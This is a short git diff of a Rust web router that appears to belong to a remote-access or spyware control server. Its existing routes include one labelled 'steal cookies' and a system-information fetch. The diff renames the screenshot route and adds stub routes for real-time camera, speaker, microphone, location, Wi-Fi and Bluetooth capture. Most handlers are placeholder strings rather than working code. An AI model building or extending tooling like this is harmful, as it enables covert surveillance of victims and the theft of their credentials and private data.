@@ -21,7 +21,13 @@ pub fn all_routes(shellstate: Arc<Mutex<ShellState>>) -> Router {
         .route("/cookie", post("steal cookies"))
         .route("/fetch", post(fetch::fetch_sys_info))
         // routes for real time data
-        .route("/scrn", post(scrn::screenshot))
+        .route("/skrin", post(scrn::screenshot))
+        .route("/kamera", post("real time camera"))
+        .route("/spikar", post("real time speaker"))
+        .route("/maik", post("real time mic"))
+        .route("/lokesan", post("real time location"))
+        .route("/oaifai", post("real time wifi"))
+        .route("/blootooth", post("real time bluetooth"))
         // extensions
         .layer(Extension(shellstate))
 }
